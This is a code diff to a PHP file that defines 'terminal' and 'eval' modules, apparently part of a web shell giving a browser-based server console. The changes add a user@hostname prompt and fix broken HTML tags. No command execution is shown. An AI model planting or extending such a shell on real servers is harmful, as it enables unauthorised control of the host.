@@ -62,7 +62,21 @@ $GLOBALS['module']['terminal']['id'] = "terminal";
 $GLOBALS['module']['terminal']['title'] = "Terminal";
 $GLOBALS['module']['terminal']['js_ontabselected'] = "
 if(!portableMode) $('#terminalInput').focus();";
-$GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span id='terminalCwd' class='strong'>".$cwd."&gt;</span</td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>";
+if (function_exists('posix_getpwuid')) {
+    $user = posix_getpwuid(posix_geteuid())['name'];
+} else {
+    $user = getenv('USERNAME');
+    if(!$user) {
+        $user = get_current_user();
+    }
+}
+$hostname = gethostname();
+if(!$hostname) {
+    $hostname = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:isset($_SERVER["SERVER_NAME"])?$_SERVER["SERVER_NAME"]:"localhost";
+} else {
+    $hostname = pathinfo($hostname, PATHINFO_FILENAME);
+}
+$GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span class='strong'>".$user."@".$hostname."</span>:<span id='terminalCwd' class='strong'>".$cwd."&gt;</span></td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>";
 
 
 $GLOBALS['module']['eval']['id'] = "eval";
@@ -93,7 +107,7 @@ $GLOBALS['module']['eval']['content'] = "
 		</td>
 	</tr>
 	
-	<tr><td colspan='4'><pre id='evalOutput'>You can also press ctrl+enter to submit</pre></td</tr>
+	<tr><td colspan='4'><pre id='evalOutput'>You can also press ctrl+enter to submit</pre></td></tr>
 </tbody>
 </table>
 ";
